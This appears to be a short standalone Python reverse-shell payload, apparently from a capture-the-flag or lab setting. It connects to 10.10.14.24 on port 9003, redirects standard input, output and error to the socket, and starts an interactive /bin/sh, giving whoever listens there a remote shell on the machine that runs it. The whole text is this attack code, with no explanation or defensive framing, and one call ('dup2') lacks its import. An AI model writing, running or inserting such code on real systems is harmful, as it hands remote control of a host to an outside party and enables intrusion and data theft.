import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.24",9003))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
